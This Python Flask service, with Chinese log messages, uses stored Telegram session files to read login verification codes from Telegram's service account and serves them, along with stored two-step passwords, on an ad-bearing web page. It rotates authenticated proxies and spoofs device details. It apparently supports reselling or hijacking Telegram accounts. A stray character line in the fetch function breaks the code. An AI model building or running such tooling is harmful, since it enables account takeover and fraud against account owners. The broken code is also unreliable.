import os
import json
import asyncio
from telethon import TelegramClient, events
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from telethon.sessions import StringSession
from flask import Flask, request
import logging
from dotenv import load_dotenv
import re
import time
import random

load_dotenv()

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
API_ID = int(os.getenv("TELEGRAM_APP_ID"))
API_HASH = os.getenv("TELEGRAM_APP_HASH")
API_PORT = int(os.getenv("API_PORT", "7788"))
_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list

    proxy_file = "proxy.txt"
    valid_proxies = []

    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def get_html_template(template_name):
    template_path = os.path.join(os.path.dirname(__file__), template_name)
    if os.path.exists(template_path):
        with open(template_path, 'r', encoding='utf-8') as f:
            return f.read()
    return None

def get_twofa_from_api(sid):
    try:
        api_path = "acd/api.json"
        if os.path.exists(api_path):
            with open(api_path, 'r') as f:
                api_data = json.load(f)
                return api_data.get(sid, {}).get('two_fa', '------')
    except:
        pass
    return '------'

def get_session_config(sid):
    try:
        api_path = "acd/api.json"
        if os.path.exists(api_path):
            with open(api_path, 'r') as f:
                api_data = json.load(f)
                return api_data.get(sid, {})
    except:
        pass
    return {}

def get_ads_from_env():
    ads = []
    for i in range(1, 4):
        ads_str = os.getenv(f"ADS_{i}")
        if ads_str and '-' in ads_str:
            try:
                text, url = ads_str.split('-', 1)
                ads.append({
                    'text': text.strip(),
                    'url': url.strip()
                })
            except ValueError:
                continue
    return ads

def render_with_ads(template_name, **kwargs):
    template = get_html_template(template_name)
    if not template:
        return None

    ads_data = get_ads_from_env()
    ads_meta = json.dumps(ads_data, ensure_ascii=False)

    for key, value in kwargs.items():
        template = template.replace(f'{{{key}}}', str(value))

    meta_tag = f'<meta name="ads-data" content=\'{ads_meta}\'>'
    template = template.replace('<head>', f'<head>{meta_tag}')

    return template

@app.route('/getcode', methods=['GET'])
def get_code():
    sid = request.args.get('id')
    if not sid:
        return render_with_ads('unavailable.html', error='缺少id参数'), 400

    session_path = f"acd/{sid}.session"
    if not os.path.exists(session_path):
        return render_with_ads('unavailable.html', error='Session不存在'), 404

    twofa = get_twofa_from_api(sid)
    code = fetch_code_sync(sid, session_path)

    if code:
        return render_with_ads('suc.html', code=code, twofa=twofa)

    return render_with_ads('unavailable.html', error='未获取到验证码'), 404

def fetch_code_sync(sid, session_path):
    async def _fetch():
        config = get_session_config(sid)
）
        app_id = config.get('app_id')
        if app_id is None:
            app_id = API_ID
        else:
            try:
                app_id = int(app_id)
            except (ValueError, TypeError):
                app_id = API_ID

        app_hash = config.get('app_hash')
        if not app_hash:
            app_hash = API_HASH

        device_model = config.get('device_model') or None
        app_version = config.get('app_version') or None
        system_lang_code = config.get('system_lang_code') or None

        proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(proxy) if proxy else None

        client = TelegramClient(
            session_path,
            app_id,
            app_hash,
            connection=ConnectionTcpAbridged,
            proxy=proxy_dict,
            device_model=device_model,
            app_version=app_version,
            system_lang_code=system_lang_code
        )
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return None
            msgs = await client.get_messages(777000, limit=20)
            for msg in msgs:
                text = msg.message or ''
                codes = re.findall(r'\d{5,6}', text)
                if codes:
                    latest_code = codes[0]
                    logger.info(f"从历史消息获取最新验证码 {latest_code} for {sid}")
                    return latest_code
            future = asyncio.Future()

            @client.on(events.NewMessage)
            async def handler(event):
                if event.sender_id == 777000:
                    text = event.message.message or ''
                    codes = re.findall(r'\d{5,6}', text)
                    if codes and not future.done():
                        logger.info(f"从新消息获取验证码 {codes[0]} for {sid}")
                        future.set_result(codes[0])
                        await client.disconnect()

            try:
                result = await asyncio.wait_for(future, timeout=30)
                return result
            except asyncio.TimeoutError:
                logger.info(f"获取验证码超时 {sid}")
                return None

        except Exception as e:
            logger.error(f"获取验证码失败 {sid}: {e}")
            return None
        finally:
            await client.disconnect()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_fetch())
    finally:
        loop.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=API_PORT, debug=False)
